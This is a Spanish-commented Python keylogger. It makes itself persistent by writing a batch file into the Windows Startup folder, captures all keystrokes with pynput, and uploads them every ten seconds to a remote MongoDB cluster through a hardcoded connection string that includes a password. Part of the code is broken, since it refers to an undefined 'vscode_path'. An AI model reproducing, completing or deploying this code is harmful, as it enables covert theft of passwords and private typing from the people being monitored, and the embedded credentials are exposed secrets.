import os
import threading
import time
from pynput import keyboard
from pymongo import MongoClient

# Ruta del archivo Python actual
current_script = os.path.abspath(__file__)

# Ruta del archivo .bat que se creará en la carpeta de inicio
startup_folder = os.getenv('APPDATA') + r'\Microsoft\Windows\Start Menu\Programs\Startup'
bat_file_path = os.path.join(startup_folder, 'run_keylogger.bat')

def create_startup_file():
    # Contenido del archivo .bat actualizado para abrir y ejecutar el script en VS Code
    bat_content = f'''@echo off
        rem Verificar si Python está instalado
        where python >nul 2>nul
        if %ERRORLEVEL% neq 0 (
            echo Python no está instalado. Por favor, instale Python.
            exit /b
        )

        rem Instalar las dependencias necesarias
        python -m pip install --upgrade pip
        pip install pynput pymongo

        rem Verificar si Visual Studio Code está instalado
        if not exist "{vscode_path}" (
            echo Visual Studio Code no está instalado. Por favor, instale Visual Studio Code.
            exit /b
        )

        rem Ruta del script Python
        set "PYTHON_SCRIPT={current_script}"

        rem Crear un archivo tasks.json para ejecutar el script en VS Code
        echo {{ > "%USERPROFILE%\\.vscode\\tasks.json"
        echo   "version": "2.0.0", >> "%USERPROFILE%\\.vscode\\tasks.json"
        echo   "tasks": [ >> "%USERPROFILE%\\.vscode\\tasks.json"
        echo     {{ >> "%USERPROFILE%\\.vscode\\tasks.json"
        echo       "label": "Run Python Script", >> "%USERPROFILE%\\.vscode\\tasks.json"
        echo       "type": "shell", >> "%USERPROFILE%\\.vscode\\tasks.json"
        echo       "command": "python", >> "%USERPROFILE%\\.vscode\\tasks.json"
        echo       "args": [ >> "%USERPROFILE%\\.vscode\\tasks.json"
        echo         "%PYTHON_SCRIPT%" >> "%USERPROFILE%\\.vscode\\tasks.json"
        echo       ], >> "%USERPROFILE%\\.vscode\\tasks.json"
        echo       "group": {{ >> "%USERPROFILE%\\.vscode\\tasks.json"
        echo         "kind": "build", >> "%USERPROFILE%\\.vscode\\tasks.json"
        echo         "isDefault": true >> "%USERPROFILE%\\.vscode\\tasks.json"
        echo       }}, >> "%USERPROFILE%\\.vscode\\tasks.json"
        echo       "problemMatcher": [] >> "%USERPROFILE%\\.vscode\\tasks.json"
        echo     }} >> "%USERPROFILE%\\.vscode\\tasks.json"
        echo   ] >> "%USERPROFILE%\\.vscode\\tasks.json"
        echo }} >> "%USERPROFILE%\\.vscode\\tasks.json"

        rem Abrir Visual Studio Code y el script
        start "" "{vscode_path}" "{current_script}"

        rem Espera a que VS Code abra el archivo
        timeout /t 5 /nobreak

        rem Ejecutar el script en la terminal integrada de VS Code usando un comando VS Code específico
        "{vscode_path}" --folder-uri "{current_script}" -r -g -n
        "{vscode_path}" --install-extension ms-python.python --force
        "{vscode_path}" --command "workbench.action.terminal.runActiveFile"

        exit
'''

    with open(bat_file_path, 'w') as bat_file:
        bat_file.write(bat_content)
        
    print(f'Archivo de inicio creado en: {bat_file_path}')

def main():
    # Conexión a MongoDB
    mongo_uri = "mongodb+srv://iraldejordan10:r5dcxq5RHNDrxt69@jarviscluster.et2fo.mongodb.net/"
    client = MongoClient(mongo_uri)
    db = client["keylogger_db"]       # Nombre de la base de datos
    collection = db["keystrokes"]     # Nombre de la colección

    # Lista para almacenar las teclas pulsadas
    keystrokes = []

    def on_press(key):
        try:
            keystrokes.append(key.char)
        except AttributeError:
            # Maneja teclas especiales
            if key == keyboard.Key.space:
                keystrokes.append(' ')
            elif key == keyboard.Key.enter:
                keystrokes.append('\n')
            elif key == keyboard.Key.tab:
                keystrokes.append('\t')
            elif key == keyboard.Key.backspace and keystrokes:
                keystrokes.pop()  # Eliminar la última tecla registrada en caso de backspace

    def store_keystrokes():
        while True:
            time.sleep(10)  # Espera 5 minutos (300 segundos)
            if keystrokes:
                # Unir las teclas en una sola cadena de texto
                data = ''.join(keystrokes)
                # Insertar en la colección
                collection.insert_one({"text": data})
                keystrokes.clear()  # Limpiar la lista después de almacenarla

    # Iniciar el hilo de almacenamiento en segundo plano
    store_thread = threading.Thread(target=store_keystrokes)
    store_thread.daemon = True
    store_thread.start()

    # Escuchar las teclas en segundo plano
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    # Crear el archivo de inicio solo la primera vez
    if not os.path.isfile(bat_file_path):
        create_startup_file()
    
    main()
